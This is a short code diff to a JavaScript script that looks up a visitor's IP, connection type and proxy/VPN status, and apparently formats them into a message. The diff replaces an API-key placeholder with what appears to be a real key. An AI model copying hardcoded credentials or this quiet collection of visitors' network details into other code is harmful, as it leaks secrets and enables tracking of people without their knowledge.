@@ -101,16 +101,23 @@ fetch('https://ipapi.co/json/')
   
     let TypeInternet = navigator.connection.effectiveType;
 
+let isProxy, isVPN;
+
 fetch(`https://v2.api.iphub.info/ip/${ip}`, {
     headers: {
-        'X-Key': 'YOUR_API_KEY'
+        'X-Key': 'MjM2OTc6U2s1cWtyT0dEdzZYRmVGa2F5YjNRZm1GTmhxd0tZaW4='
     }
 })
     .then(response => response.json())
     .then(data => {
-        let isProxy = data.proxy ? true : false;
-        let isVPN = data.isp.vpn === 'true' ? true : false;
+        isProxy = data.proxy ? true : false;
+        isVPN = data.isp.vpn === 'true' ? true : false;
+    })
+    .then(() => {
+        console.log(isProxy);
+        console.log(isVPN);
     });
+
         
         const message = `
       * Ip 🌐*
